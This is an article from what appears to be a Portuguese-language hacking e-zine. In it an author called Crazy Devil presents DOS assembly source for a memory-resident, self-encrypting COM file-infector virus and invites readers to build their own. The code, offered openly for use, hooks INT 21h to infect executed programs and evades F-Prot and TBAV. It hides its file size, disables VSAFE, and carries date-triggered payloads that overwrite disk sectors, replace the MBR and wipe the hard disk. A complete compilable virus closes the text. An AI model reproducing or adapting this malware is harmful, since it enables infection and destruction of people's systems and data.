@@ -1,0 +1,915 @@
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
+                             
+                              6=#@!Virus!@#=6
+
+                                     by
+
+                                 Crazy Devil
+
+           Ae moçada do mal, estou eu aqui pela primeira vez participando
+           da FW na minha opiniao um excelente e-zine hacking hehehehe
+           Eu sou Crazy Devil programo em asm e a pedido do meu
+           camarada Draco escrevi esta metéria.
+           Primeiramente vou deixar claro o que eu vou fazer.
+           Vou colocar um modo legal de se fazer vírus em asm é como
+           se eu colocasse as "propriedades" e depois vocês montam do jeito
+           que vocês quiserem um vírus esperto dai o resto é com vocês.
+           Qualquer lamah comsegue fazer isto pelo fato de o inbecil nao ter
+           que saber nem programar tem apenas que penssar (se é que
+           consseguem)
+
+           Fugindo do anti vírus:
+           Para fugir do anti vírus é simples a área que ele detecta é a açao
+           entao é só mudar o MB pelo hexadecimal.
+           Em todos os vírus é obigatoria colocar a propriedade que tem uma
+           linha de asteriscos no começo.
+
+           Compilando o vírus.
+
+           Você pode pegar o arquivo TASM.EXE na page da FW ou se preferir
+           pode procura-lo na busca por FTP.
+
+           CRAZYYYYYYYYYYYYYYY DEVILLLLLLLLLLLLL
+
+==============================================================================
+                              |||REPRODUÇAO|||
+      ===============================================================
+******************************************************************************
+                                   ;
+        pushf                      ;colocar o registro             
+        pusha                      ;em stack                       
+        push si                    ;                               
+        push di                    ;                              
+        push bp                    ;                               
+        push es                    ;                              
+        push ds                    ;                              
+        ;-------------------------------------------------------------
+        push cs                    ;                              
+        pop ds                     ;                              
+        mov ax,3524H               ;pegue os erros de controle do dos                      
+        int 21h                    ;imterrompa                        
+        mov word ptr error,es      ;e coloque em cs:error                      
+        mov word ptr error+2,bx    ;            
+        mov ax,2524H               ;passe os erros de controle do dos                     
+        mov dx,offset all          ;para o meu "trap mask"                      
+        int 21h                    ;         
+        ;-------------------------------------------------------------
+        pop ds                     ;
+        pop es                     ;refaça os registros
+        pop bp                     ;
+        pop di                     ;
+        pop si                     ;
+        popa                       ;
+        popf                       ;
+        ;-------------------------------------------------------------
+        pushf                      ;coloque o registro
+        pusha                      ;     
+        push si                    ;Ese tal demonio é louco
+        push di                    ;
+        push bp                    ;Por Favor
+        push es                    ;exorsizen-no
+        push ds                    ;
+        ;-------------------------------------------------------------
+        mov ax,4300h                 ;       
+        int 21h                      ;pegue o arquivo    
+        mov word ptr cs:[attrib],cx  ;atributos
+        ;-------------------------------------------------------------
+        mov ax,4301h                 ;le saco los atributos all        
+        xor cx,cx                    ;arquivo
+        int 21h                      ;
+        ;-------------------------------------------------------------  
+        mov ax,3d02h                 ;abra o arquivo 
+        int 21h                      ;para ler/escrever
+        mov bx,ax                    ;bx=handle
+        ;-------------------------------------------------------------
+        mov ax,5700h                ;     
+        int 21h                     ;pegue o arquivo da data 
+        mov word ptr cs:[hora],cx   ;coloque a hora   
+        mov word ptr cs:[dia],dx    ;coloque o dia 
+        and cx,word ptr cs:[fecha]  ;calcule os segundos    
+        cmp cx,word ptr cs:[fecha]  ;is ecual to 58? (DEDICATE TO N-POX)    
+        jne seguir                  ;yes! o arquivo está infectado     
+        jmp cerrar                  ;
+        ;------------------------------------------------------------
+        seguir:                     ;     
+        mov ax,4202h                ;mova pointer para o final
+        call movedor                ;do arquivo
+        ;------------------------------------------------------------
+        push cs                     ;   
+        pop ds                      ; 
+        sub ax,3                    ;calcule 
+        mov word ptr [cs:largo],ax  ;jmp long
+        ;-------------------------------------------------------------
+        mov ax,04200h               ;mova pointer para  
+        call movedor                ;o começo do arquivo
+        ;----------------------------------------------------------                                          
+        push cs                     ;   
+        pop ds                      ;leia tres vezes o byte  
+        mov ah,3fh                  ;                           
+        mov cx,3                    ;
+        lea dx,[cs:real]            ;coloque o byte em cs:[real]
+        int 21h                     ;
+        ;----------------------------------------------------------                                          
+        cmp word ptr cs:[real],05a4dh   ;as duas vezes bytes = 'MZ' ?
+        jne er1                         ;yes! é um EXE... fuckkk!
+        ;----------------------------------------------------------
+        jmp cerrar
+        er1:
+        ;----------------------------------------------------------                                          
+        mov ax,4200h      ;mova pointer                               
+        call movedor      ;para o começo do arquivo
+        ;----------------------------------------------------------                                          
+        push cs           ;       
+        pop ds            ; 
+        mov ah,40h        ;  
+        mov cx,1          ;escreva o jmp 
+        lea dx,[cs:jump]  ;instruçoes no
+        int 21h           ;primeiro byte do arquivo
+        ;----------------------------------------------------------                                          
+        mov ah,40h         ;escreva o valor jmp
+        mov cx,2           ;no arquivo
+        lea dx,[cs:largo]  ; 
+        int 21h            ;
+        ;----------------------------------------------------------                                          
+        mov ax,04202h      ;mova o pointer para 
+        call movedor       ;o final do arquivo
+        ;----------------------------------------------------------                                          
+        push cs                     ;        
+        pop ds                      ;moa o codigo  
+        push cs                     ;do meu vírus     
+        pop es                      ;para cs:end+50     
+        cld                         ;para encryptar         
+        mov si,100h                 ;    
+        mov di,offset fin + 50      ;      
+        mov cx,offset fin - 100h    ;        
+        rep movsb                   ;      
+        ;----------------------------------------------------------                                          
+        mov cx,offset fin           
+        mov di,offset fin + 50 + (offset crypt2 - offset start)  ;virus         
+        enc:                              ;           
+        xor byte ptr cs:[di],1            ;encryptar o virus              
+        inc di                            ;codigo                 
+        loop enc                          ;              
+        ;---------------------------------------------------------
+        mov cx,offset fin           
+        mov di,offset fin + 50 + (offset crypt - offset start)  ;virus         
+        mov dx,1
+        enc2:                              ;           
+      
+        dec word ptr [di]
+        xor byte ptr [di],063h
+        not byte ptr [di]
+        dec byte ptr [di]
+        inc di
+        inc di                             ;codigo do vírus                 
+        loop enc2                          ;              
+        ;--------------------------------------------
+        mov ah,40h                       ;
+        mov cx,offset fin - offset start ;copie o vírus           
+        mov dx,offset fin + 50           ;para o final do arquivo
+        int 21h                          ;
+        ;----------------------------------------------------------                                          
+        cerrar:                          ;
+                                         ;refaça a
+        mov ax,5701h                     ;data e tempo    
+        mov cx,word ptr cs:[hora]        ;do arquivo   
+        mov dx,word ptr cs:[dia]         ;     
+        or cx,word ptr cs:[fecha]        ;e marque segundos  
+        int 21h                          ; 
+        ;----------------------------------------------------------                                          
+        mov ah,3eh                       ; 
+        int 21h                          ;feche o arquivo
+        ;----------------------------------------------------------                                          
+        pop ds                           ;
+        pop es                           ;refaça os
+        pop bp                           ;registros
+        pop di                           ; 
+        pop si                           ;
+        popa                             ;
+        popf                             ;
+        ;----------------------------------------------------------                                          
+        pusha                           ;   
+                                        ;                                                             
+        mov ax,4301h                    ;refaça os atributos 
+        mov cx,word ptr cs:[attrib]     ;do arquivo
+        int 21h                         ;   
+                                        ;
+        popa                            ; 
+        ;----------------------------------------------------------                                          
+        pushf                           ;                           
+        pusha                           ; 8-(  = f-prot                       
+        push si                         ;                       
+        push di                         ; 8-(  = tbav   
+        push bp                         ;                       
+        push es                         ; 8-)  = I'm                        
+        push ds                         ;                              
+        ;----------------------------------------------------------                                          
+        mov ax,2524H                    ;                         
+        lea bx,error                    ;refaça os erros handler                        
+        mov ds,bx                       ;
+        lea bx,error+2                  ;                         
+        int 21h                         ;                       
+        ;----------------------------------------------------------                                          
+        pop ds                          ;
+        pop es                          ;
+        pop bp                          ;refaça os registros 
+        pop di                          ;
+        pop si                          ;
+        popa                            ;
+        popf                            ;
+        ;----------------------------------------------------------                                          
+        JMP A3                          ;jmp to orig. INT 21
+                                        ;
+       ===============================================================
+==============================================================================      
+==============================================================================
+                      |||CAINDO NA MEMORIA RESIDENTE|||
+        ==============================================================
+        mov   ax,3521h                  
+        int   21h                        ;modostore em int 21 vetor 
+        mov   word ptr [bp+int21],bx     ;no cs:int21
+        mov   word ptr [bp+int21+2],es   ;
+        ;---------------------------------------------------------------
+        push cs                          ; 
+        pop ax                           ;ax = meu atual seguimento                             
+        dec ax                           ;dec meu seguimentopaa olhar meu MCB
+        mov es,ax                        ;
+        mov bx,es:[3]                    ;ler #3 byte no meu MCB =total usando
+                                         ;memoria 
+        ;---------------------------------------------------------------
+        push cs                          ;   
+        pop es                           ;   
+        sub bx,(offset fin - offset start + 15)/16  ;subrair a margem do
+                                                    ;meu virus
+        sub bx,17 + offset fin           ;e 100H do PSP total
+        mov ah,4ah                       ;usando memoria
+        int 21h                          ;coloque novo valor para MCB 
+        ;---------------------------------------------------------------
+        mov bx,(offset fin - offset start + 15)/16 + 16 + offset fin     
+        mov ah,48h                      ;                              
+        int 21h                         ;requerer a memoria para um fuck DOS!                                                 
+        ;---------------------------------------------------------------
+        dec ax                          ;ax=novo seguimento 
+        mov es,ax                       ;ax-1= novo seguimento MCB 
+        mov byte ptr es:[1],8           ;colocar '8' n seguimento
+        ;--------------------------------------------------------------                                
+        inc ax                          ; 
+        mov es,ax                       ;es = novo seguimento
+        lea si,[bp + offset start]      ;si = começar o vírus 
+        mov di,100h                     ;di = 100H (posiçao do psp) 
+        mov cx,offset fin - start       ;cx = lag no virus
+        push cs                         ;
+        pop ds                          ;ds = cs
+        cld                             ;mover o codigo
+        rep movsb                       ;ds:si >> es:di
+        ;--------------------------------------------------------------
+        mov dx,offset virus             ;dx = novo int21 handler
+        mov ax,2521h                    ;
+        push es                         ; 
+        pop ds                          ; 
+        int 21h                         ;set em vetores 
+        ;-------------------------------------------------------------
+        pum2:                               ;  
+                                            ; 
+        mov ah,byte ptr [cs:bp + real]      ;refaça o 3  
+        mov byte ptr cs:[100h],ah           ;primeiro bytes  
+        mov ax,word ptr [cs:bp + real + 1]  ;
+        mov word ptr cs:[101h],ax           ;
+        ;-------------------------------------------------------------
+        mov ax,100h                         ;
+        jmp ax                              ;jmp para executar
+                                            ;
+        ==============================================================
+==============================================================================
+==============================================================================
+                         |||ÁREA DE SUB ROTINAS|||
+        ==============================================================
+******************************************************************************
+                                        ;
+        movedor:                        ;   
+                                        ; 
+        xor cx,cx                       ;use para mover arquivo pointer         
+        xor dx,dx                       ;       
+        int 21h                         ;        
+        ret                             ;        
+        ;----------------------------------------------------------                                          
+        all:                            ;  
+                                        ; 
+        XOR AL,AL                       ;use para set 
+        iret                            ;em error flag
+        =============================================================
+==============================================================================
+==============================================================================
+                              |||DATA ÁREA|||
+        =============================================================
+******************************************************************************
+
+        largo  dw  ?
+        jump   db  0e9h
+        real   db  0cdh,20h,0
+        hora   dw  ?
+        dia    dw  ?
+        attrib dw  ?
+        int21  dd  ?
+        error  dd  ?
+
+        ;---------------------------------
+        action:                          ; 
+        MOV AH,2AH                       ;        
+        INT 21H                          ;pegue a data           
+        CMP Dl,byte ptr cs:[action_dia+bp]  ;esta é equaçao do meu dia?                 
+        JE  cont                         ;no! fuck           
+        cmp byte ptr cs:[action_dia+bp],32  ;
+        jne no_day                       ;
+        cont:                            ; 
+        cmp dh,byte ptr cs:[action_mes+bp]  ;esta é a equaçao do meu mês?            
+        je set                           ;
+        cmp byte ptr cs:[action_mes+bp],13  ;
+        jne NO_DAY                       ;no! fuck            
+        set:                             ; 
+        mov ah,0dh                       ;     
+        int 21h                          ;reset no disco 
+        mov al,2                         ;
+        mov cx,0ffffh                    ;
+        mov dx,0                         ;  
+        int 26h                          ;fuck os setores ffffh  
+        mov ah,0dh                       ;reste no disco  
+        int 21h                          ;   
+        mov al,2                         ;    
+        mov cx,0ffffh                    ;    
+        mov dx,0ffffh                    ;new fuck+ 
+        int 26h                          ;heheheh!!! 
+        NO_DAY:                          ;             
+        ret                              ;
+        ;---------------------------------
+        MBR:
+        =============================================================
+==============================================================================
+==============================================================================
+                        |||COMEÇAR A ESCREVER MBR-BOMB|||
+        ============================================================
+        mov ax,9f80h                ;muita memoria                  
+        mov es,ax                   ;bom para buffer                
+        mov ax,0201h                ;leia o original         
+        mov cx,0001h                ;MBR no disco           
+        mov dx,0080h                ;              
+        xor bx,bx                   ;para buffer 9f80:0000h                       
+        int 13h                     ;           
+        push cs                     ; 
+        pop ds                      ; 
+        mov ax,9f80h                ;adicionar minha MBR-BOMB                                    
+        mov es,ax                   ;o MBR real em meu       
+        mov si,offset fat           ;buffer              
+        xor di,di                   ;                   
+        mov cx,105                  ;ds:[fat]=>9f80:0000h
+        repe movsb                  ;total 105bytes                   
+        mov ax,9f80h                ;   
+        mov es,ax                   ;   
+        xor bx,bx                   ;repaça o original    
+        mov ax,0301h                ;MBR no disco para a
+        xor ch,ch                   ;nova MBR-BOMB.  
+        mov dx,0080h                ;
+        mov cl,1                    ;CUIDADO! VSAFE/MSAVE 
+        mov bx,0                    ;NOTIFICOU ESTA AÇAO ACTION 
+        int 13h                     ; 
+        ret                         ;
+        =============================================================
+==============================================================================
+==============================================================================
+                        |||COMEÇAR OS CODIGOS MBR|||
+        ============================================================
+        fat:                              ;       
+        cli                               ;#       
+        xor     ax,ax                     ;#     
+        mov     ss,ax                     ;#       
+        mov     sp,7C00h                  ;#        
+        mov     si,sp                     ;#        
+        push    ax                        ;#    
+        pop     es                        ;# 
+        push    ax                        ;# 
+        pop     ds                        ;#     
+        sti                               ;#
+                                          ;#   
+        pushf                             ;#   
+        push ax                           ;# 
+        push cx                           ;# = Este codigo faz o
+        push dx                           ;#   original MBR
+        push ds                           ;#   (NAO MODIFIQUE)
+        push es                           ;#   
+        MOV AH,04H                        ; Leia o tempo real                       
+        INT 1AH                           ; Relógio         
+        CMP DH,cs:byte ptr action_mes     ; o M6es?     
+        JE CAGO                           ; yes! SNIF SNIF HD. 
+        lit:
+        pop es
+        pop ds
+        pop dx  
+        pop cx
+        pop ax
+        popf
+        jmp booti
+        CAGO:
+        =============================================================
+==============================================================================
+==============================================================================
+                        |||COMEÇAR OS CODIGOS DESTRUTIVOS|||
+        ============================================================
+
+        rip_hd:                            
+                                      ;@                                  
+                        xor dx, dx    ;@                
+        rip_hd1:                      ;@
+                        mov cx, 2     ;@                 
+                        mov ax, 311h  ;@    
+                        mov dl, 80h   ;@             
+                        mov bx, 5000h ;@       
+                        mov es, bx    ;@ 
+                        int 13h       ;@          
+                        jae rip_hd2   ;@         
+                        xor ah, ah    ;@       
+                        int 13h       ;@       
+                        rip_hd2:      ;@        
+                        inc dh        ;@        
+                        cmp dh, 4     ;@                
+                        jb rip_hd1    ;@ 
+                        inc ch        ;@        
+                        jmp rip_hd            
+
+        =============================================================
+==============================================================================
+==============================================================================
+                        |||FINALIZAR OS CODIGOS DESTRUTIVOS|||
+        ============================================================
+        booti:
+        xor ax,ax     ;#         
+        mov es,ax     ;#       
+        mov bx,7c00h  ;#             
+        mov ah,02     ;#          
+        mov al,1      ;#         
+        mov cl,1      ;# #= Este codigo faz o original       
+        mov ch,0      ;#    MBR        
+        mov dh,1      ;#    (NAO MODIFIQUE)    
+        mov dl,80h    ;#   
+                      ;#             
+        int 13h       ;#                
+                      ;#          
+        db 0eah,00,7ch,00,00 ;#    
+        =============================================================
+==============================================================================
+==============================================================================
+                          |||FINAL DOS CODIGOS MBR|||
+        ============================================================
+        ;---------------------------------
+        TRASH_RN:                        ; 
+        MOV AH,2DH                       ;        
+        INT 21H                          ;PEGUE A DATA           
+        CMP Dl,6                         ;É =6 (RAN 0-99)                 
+        jne NO_DAYY                      ;no! fuck            
+        mov ah,0dh                       ;     
+        int 21h                          ;reset o disco 
+        mov al,2                         ;
+        mov cx,0ffffh                    ;
+        mov dx,0                         ;  
+        int 26h                          ;fuck os setores ffffh  
+        mov ah,0dh                       ;resete o disco  
+        int 21h                          ;   
+        mov al,2                         ;    
+        mov cx,0ffffh                    ;    
+        mov dx,0ffffh                    ;new fuck+ 
+        int 26h                          ;heheheh!!! 
+        NO_DAYY:                         ;             
+        ret                              ;
+        ;---------------------------------
+        ;---------------------------------
+        ANTI_V:                          ; 
+        MOV AX,0FA01H                    ;REMOVA VSAFE DA MEMORIA        
+        MOV DX,5945H                     ; 
+        INT 21H                          ;           
+        ret                              ;
+        ;---------------------------------
+
+        ;*****************************************************
+        dir_s:                                                               
+             pushf                                                         
+             push    cs                                                    
+             call    a3                      ;Pegue arquivo Stats                       
+             test    al,al                   ;Bom FCB?                            
+             jnz     no_good                 ;no                                 
+             push    ax                                                 
+             push    bx                                                    
+             push    es                                                    
+             mov     ah,51h                  ;Este é Undocumentadd? huh...          
+             int     21h                                                   
+             mov     es,bx                                                 
+             cmp     bx,es:[16h]                                           
+             jnz     not_infected                        
+             mov     bx,dx                                                 
+             mov     al,[bx]                                               
+             push    ax                                                    
+             mov     ah,2fh                   ;Pegue arquivo DTA                         
+             int     21h                                                   
+             pop     ax                                                    
+             inc     al                                                    
+             jnz     fcb_okay                                              
+             add     bx,7h                                                 
+fcb_okay:    mov     ax,es:[bx+17h]                                   
+             and     ax,1fh                   ;UnMask a Segunda Field                 
+             xor     al,byte ptr cs:fechad                                      
+             jnz     not_infected                                            
+             and     byte ptr es:[bx+17h],0e0h                            
+             sub     es:[bx+1dh],OFFSET FIN - OFFSET START  ;Sim menos
+                                                            ;virus size
+             sbb     es:[bx+1fh],ax                                        
+not_infected:pop     es                                                    
+             pop     bx                                                    
+             pop     ax                                                    
+no_good:     iret                                                          
+        =============================================================
+==============================================================================
+==============================================================================
+                          |||FINAL DO CODIGOS VÍRUS|||
+        ============================================================
+******************************************************************************
+        action_dia Db 020H ;dia para agir
+        action_mes Db 0dH ;mês da açao
+        FECHA DW 01eH ;Secon for mark
+        FECHAd Db 01eH ;Secon for mark dir st
+        fin:
+        code ends
+        end start
+        =============================================================
+==============================================================================
+
+           Este é um vírus que eu fiz para a FW.
+
+----------------Corta
+
+.286
+code    segment
+assume cs:code,ds:code
+org  100h
+
+start:  CALL NEXT 
+ 
+NEXT:  
+       mov di,sp             ;faça stack em pointer location 
+       mov bp,ss:[di]        ;faça "DELTA HANDLE" para meu virus       
+       sub bp,offset next    ;subtraia o codigo grande deste código 
+
+cmp byte ptr cs:[crypt],0b9h ;é a primeira vez?        
+je crypt2                    ;sim! nao decrypt              
+;----------------------------------------------------------                                          
+mov cx,offset fin            ;cx = totalidade do vírus              
+lea di,[offset crypt]+ bp    ;di = primeiro byte para decriptar         
+mov dx,1                     ;dx = valor para decriptar          
+;----------------------------------------------------------                                                   
+deci:                        ;deci = fuck!                                    
+;----------------------------------------------------------
+
+ inc di
+inc di
+;----------------------------------------------------------                                                
+jmp bye                      ;######## TCHAU TCHAU F-PROT ! ##########     
+mov ah,4ch
+int 21h
+bye:                         ;#### HA É APENAS UM JMP!!###      
+;-----------------------------------------------------------                               
+mov ah,0bh                   ;######### TCHAU TCHAU TBAV ! ##########     
+int 21h                      ;###  ###        
+;----------------------------------------------------------                                   
+loop deci                    ;repita por favor!               
+                             ;           
+                              ;    
+crypt:                        ;fuck!                  
+                              ;                
+mov cx,offset fin             ;cx = totalidade do virus                 
+lea di,[offset crypt2] + bp   ;di = primeiro byte para decryptar                  
+;---------------------------------------------------------------                                              
+deci2:                        ;              
+xor byte ptr cs:[di],1        ;decrytion rotina          
+inc di                        ;muito simples...            
+loop deci2                    ;           
+;---------------------------------------------------------------
+crypt2:                       ;fuck!          
+                              ;                  
+MOV AX,0CACAH                 ;fale para residente interromper mask                  
+INT 21H                       ;checar "Eu estou residente?"   
+CMP Bh,0CAH                   ;é igual para CACA?
+JE PUM2                       ;yes! pule para rodar o programa
+call action
+
+mov   ax,3521h                  
+int   21h                        ;store o int 21 vectors 
+mov   word ptr [bp+int21],bx     ;em cs:int21
+mov   word ptr [bp+int21+2],es   ;
+;---------------------------------------------------------------
+push cs                          ; 
+pop ax                           ;ax = meu atual segmento                             
+dec ax                           ;dec meu segmento para olhar meu MCB
+mov es,ax                        ;
+mov bx,es:[3]                    ;leia o #3 byte do meu MCB =toatal de
+                                 ;memoria usada
+;---------------------------------------------------------------
+push cs                          ;   
+pop es                           ;   
+sub bx,(offset fin - offset start + 15)/16  ;sbtraia a mergem do meu virus 
+sub bx,17 + offset fin           ;e 100Hdo PSP total
+mov ah,4ah                       ;memoria usada
+int 21h                          ;coloque novo valor para MCB
+;---------------------------------------------------------------
+mov bx,(offset fin - offset start + 15)/16 + 16 + offset fin     
+mov ah,48h                      ;                              
+int 21h                         ;requerir memoria para fuder o DOS!                                                 
+;---------------------------------------------------------------
+dec ax                          ;ax=novo seguimento
+mov es,ax                       ;ax-1= novo seguimento MCB 
+mov byte ptr es:[1],8           ;coloque '8' no segmento
+;--------------------------------------------------------------                                
+inc ax                          ; 
+mov es,ax                       ;es = novo seguimento
+lea si,[bp + offset start]      ;si = começar o vírus
+mov di,100h                     ;di = 100H (posiçao psp) 
+mov cx,offset fin - start       ;cx = totalidade do virus
+push cs                         ;
+pop ds                          ;ds = cs
+cld                             ;mova o codigo
+rep movsb                       ;ds:si >> es:di
+;--------------------------------------------------------------
+mov dx,offset virus             ;dx = novo int21 handler
+mov ax,2521h                    ;
+push es                         ; 
+pop ds                          ; 
+int 21h                         ;set vectors 
+;-------------------------------------------------------------
+pum2:                               ;  
+                                    ; 
+mov ah,byte ptr [cs:bp + real]      ;refaça o terceiro byte  
+mov byte ptr cs:[100h],ah           ;
+mov ax,word ptr [cs:bp + real + 1]  ;
+mov word ptr cs:[101h],ax           ;
+;-------------------------------------------------------------
+mov ax,100h                         ;
+jmp ax                              ;jmp para executar
+                                    ;
+                          ;          
+VIRUS:                    ;  
+                          ;     
+cmp ah,4bh                ;é uma funçao 4b? 
+je REPRODUCCION           ;yes! pule para reproduçao !
+cmp ah,11h
+je dir
+cmp ah,12h
+je dir
+dirsal:
+cmp AX,0CACAH             ;é uma funçao caca?(resident chek)
+jne a3                    ;no! pule para a3 a3
+mov bh,0cah               ;yes! pule para bh
+a3:                       ;
+JMP dword ptr CS:[INT21]  ;jmp para int 21h
+ret                       ;    
+
+dir:
+jmp dir_s
+;-------------------------------------------------------------
+REPRODUCCION:              ;       
+                           ;
+pushf                      ;coloque o registro
+pusha                      ;no stack
+push si                    ;
+push di                    ;
+push bp                    ;
+push es                    ;
+push ds                    ;
+;-------------------------------------------------------------
+push cs                    ;  
+pop ds                     ;  
+mov ax,3524H               ;pegue os erros de controlo do DO                      
+int 21h                    ;interrompa                        
+mov word ptr error,es      ;e coloque em cs:error                      
+mov word ptr error+2,bx    ;            
+mov ax,2524H               ;controle de erros do DOS para o meu                    
+mov dx,offset all          ;"trap mask"     
+int 21h                    ;         
+;-------------------------------------------------------------
+pop ds                     ;
+pop es                     ;refaça o registro
+pop bp                     ;
+pop di                     ;
+pop si                     ;
+popa                       ;
+popf                       ;
+mov ax,4300h                 ;       
+int 21h                      ;pegue o arquivo  
+mov word ptr cs:[attrib],cx  ;atributos
+;-------------------------------------------------------------
+mov ax,4301h                 ;todos os atributos do arquivo       
+xor cx,cx                    ;
+int 21h                      ;
+;-------------------------------------------------------------  
+mov ax,3d02h                 ;abrir o arquivo 
+int 21h                      ;para ler e escrever
+mov bx,ax                    ;bx=handle
+;-------------------------------------------------------------
+mov ax,5700h                ;     
+int 21h                     ;pegue o arquivo da data
+mov word ptr cs:[hora],cx   ;pegue o arquivo da hora
+mov word ptr cs:[dia],dx    ;pegue o dia
+and cx,word ptr cs:[fecha]  ;calcule os segundos    
+cmp cx,word ptr cs:[fecha]  ;é igual para 58? (DEDICATE TO N-POX)    
+jne seguir                  ;yes! o arquivo esta infectado!     
+jmp cerrar                  ;
+;------------------------------------------------------------
+seguir:                     ;     
+mov ax,4202h                ;mova pointer para o final do aqruivo
+call movedor                ;
+;------------------------------------------------------------
+push cs                     ;   
+pop ds                      ; 
+sub ax,3                    ;calcule o 
+mov word ptr [cs:largo],ax  ;jmp long
+;-------------------------------------------------------------
+mov ax,04200h               ;mova pointer para o começo do arquivo 
+call movedor                ;
+;----------------------------------------------------------                                          
+push cs                     ;   
+pop ds                      ;leia três vezes o bytes  
+mov ah,3fh                  ;                           
+mov cx,3                    ;
+lea dx,[cs:real]            ;coloque os bytes em cs:[real]
+int 21h                     ;
+;----------------------------------------------------------                                          
+cmp word ptr cs:[real],05a4dh   ;os dois primeiros bytes = 'MZ' ?
+jne er1                         ;yes! é um EXE... fuckkk!
+;----------------------------------------------------------
+jmp cerrar
+er1:
+;----------------------------------------------------------                                          
+mov ax,4200h      ;mova o pointer para o começo do aqruivo                        
+call movedor      ;
+;----------------------------------------------------------                                          
+push cs           ;       
+pop ds            ; 
+mov ah,40h        ;  
+mov cx,1          ;escreva o JMP
+lea dx,[cs:jump]  ;instruçao no primeiro byte do arquivo
+int 21h           ;
+;----------------------------------------------------------                                          
+mov ah,40h         ;escreva o valor de jmp
+mov cx,2           ;no arquivo
+lea dx,[cs:largo]  ; 
+int 21h            ;
+;----------------------------------------------------------                                          
+mov ax,04202h      ;mova pointer para o final do arquivo 
+call movedor       ;
+;----------------------------------------------------------                                          
+push cs                     ;        
+pop ds                      ;mova o codigo  
+push cs                     ;do meu vírus    
+pop es                      ;para cs:end+50     
+cld                         ;para encryptar          
+mov si,100h                 ;    
+mov di,offset fin + 50      ;      
+mov cx,offset fin - 100h    ;        
+rep movsb                   ;      
+;----------------------------------------------------------                                          
+mov cx,offset fin           
+mov di,offset fin + 50 + (offset crypt2 - offset start)  ;virus         
+enc:                              ;           
+xor byte ptr cs:[di],1            ;encrypta o codigo do vírus              
+inc di                            ;
+loop enc                          ;              
+;---------------------------------------------------------
+mov cx,offset fin           
+mov di,offset fin + 50 + (offset crypt - offset start)  ;virus         
+mov dx,1
+enc2:                              ;           
+
+ inc di
+inc di                             ;codigo do vírus                  
+loop enc2                          ;              
+;--------------------------------------------
+mov ah,40h                       ;  
+mov cx,offset fin - offset start ;copie o virus para o final do arquivo           
+mov dx,offset fin + 50           ;
+int 21h                          ;
+;----------------------------------------------------------                                          
+cerrar:                          ;
+                                 ;refaça a data       
+mov ax,5701h                     ;e o tempo do arquivo    
+mov cx,word ptr cs:[hora]        ;
+mov dx,word ptr cs:[dia]         ;     
+or cx,word ptr cs:[fecha]        ;e marque os segundos  
+int 21h                          ; 
+;----------------------------------------------------------                                          
+mov ah,3eh                       ; 
+int 21h                          ;feche o arquivo
+;----------------------------------------------------------                                          
+pop ds                           ;
+pop es                           ;refaça o registro
+pop bp                           ;
+pop di                           ; 
+pop si                           ;
+popa                             ;
+popf                             ;
+;----------------------------------------------------------                                          
+pusha                           ;   
+                                ;                                                             
+mov ax,4301h                    ;refaça os atributos do arquivo 
+mov cx,word ptr cs:[attrib]     ;
+int 21h                         ;   
+                                ;
+popa                            ; 
+;----------------------------------------------------------                                          
+pushf                           ;                           
+pusha                           ; 8-(  = f-prot                       
+push si                         ;                       
+push di                         ; 8-(  = tbav   
+push bp                         ;                       
+push es                         ; 8-)  = I'm                        
+push ds                         ;                              
+;----------------------------------------------------------                                          
+mov ax,2524H                    ;                         
+lea bx,error                    ;refaça os                        
+mov ds,bx                       ;erros handler      
+lea bx,error+2                  ;                         
+int 21h                         ;                       
+;----------------------------------------------------------                                          
+pop ds                          ;
+pop es                          ;
+pop bp                          ;refaça os registros 
+pop di                          ;
+pop si                          ;
+popa                            ;
+popf                            ;
+;----------------------------------------------------------                                          
+JMP A3                          ;jmp to orig. INT 21
+                                ;
+                                ;
+movedor:                        ;   
+                                ; 
+xor cx,cx                       ;use para mover arquiv pointer         
+xor dx,dx                       ;       
+int 21h                         ;        
+ret                             ;        
+;----------------------------------------------------------                                          
+all:                            ;  
+                                ; 
+XOR AL,AL                       ;use para um set
+iret                            ;error flag
+largo  dw  ?
+jump   db  0e9h
+real   db  0cdh,20h,0
+hora   dw  ?
+dia    dw  ?
+attrib dw  ?
+int21  dd  ?
+error  dd  ?
+
+ ;---------------------------------
+action:                          ;chama label      
+MOV AH,2AH                       ;        
+INT 21H                          ;pegar data           
+CMP Dl,byte ptr cs:[action_dia+bp]  ;é igual ao meu dia?                 
+JE  cont                         ;nop! fuck ret          
+cmp byte ptr cs:[action_dia+bp],32  ;
+jne no_day                       ;
+cont:                            ; 
+cmp dh,byte ptr cs:[action_mes+bp]  ;é igual ao meu mês?            
+je set                           ;
+cmp byte ptr cs:[action_mes+bp],13  ;
+jne NO_DAY                       ;nop! fuck ret           
+set:                             ; 
+mov AH,9                         ;yeah!!          
+MOV DX,OFFSET PAO                ;mostre meu texto!         
+INT 21H                          ;agora!   
+INT 20H                          ;acabe o programa        
+NO_DAY:                          ;data incorreta              
+ret                              ;retorne a chamada
+;---------------------------------
+
+ 
+PAO:
+DB 10,13,'FUCK FUCK ALL CONSTITUITION FUCKER WORLD!!!!!!!!!!!','$'
+
+;-------------;
+Dir_S:        ;                                                      
+jmp dirsal    ;  
+no_Good:iret  ;                                                           
+;-------------;
+
+ action_dia Db 020H ;day for the action
+action_mes Db 0dH ;month for the action
+FECHA DW 06H ;Secon for mark
+FECHAd Db 06H ;Secon for mark dir st
+fin:
+code ends
+end start
+
+---------------------Corta
+
+           É isto ai halera fico por aqui espero poder escrever muito mais
+           matérias sobre ASM para a FW só estou esperando o Draco me chamar.
+
+           Valeu a todos vocês até a proxima (se é que eu vou voltar).
+
+<<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>><<FW>>
